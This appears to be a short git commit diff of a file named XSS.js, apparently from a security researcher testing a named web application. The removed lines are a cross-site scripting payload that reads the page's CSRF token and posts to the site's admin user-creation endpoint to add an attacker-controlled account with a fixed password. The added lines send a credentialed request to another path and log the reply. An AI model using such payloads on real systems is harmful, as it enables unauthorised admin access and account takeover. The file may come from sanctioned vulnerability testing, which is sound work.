e04dff5ec999829a4e040e4fc0daac9a43edb79b
Yarterss <trey@inspectiv.com>
2025-05-01 20:53:12 -0500

    Update XSS.js

--- XSS.js
+++ XSS.js
@@ -1,8 +1,4 @@
-const token = document.querySelector('input[name=csrfmiddlewaretoken]').value;
-fetch("https://insight.actionkit.com/admin/auth/user/add/", {
-  method: "POST",
-  headers: {
-    "Content-Type": "application/x-www-form-urlencoded"
-  },
-  body: `csrfmiddlewaretoken=${encodeURIComponent(token)}&email=trey%2Bxss%40inspectiv.com&username=Trey_xss&password1=nLCw4SDzV&IQtn%e&password2=nLCw4SDzV&IQtn%e&_save=Save`
-});
+fetch('https://insight.actionkit.com/dash/pages', {
+  method: 'POST',
+  credentials: 'include'
+}).then(r => r.text()).then(console.log).catch(console.error);
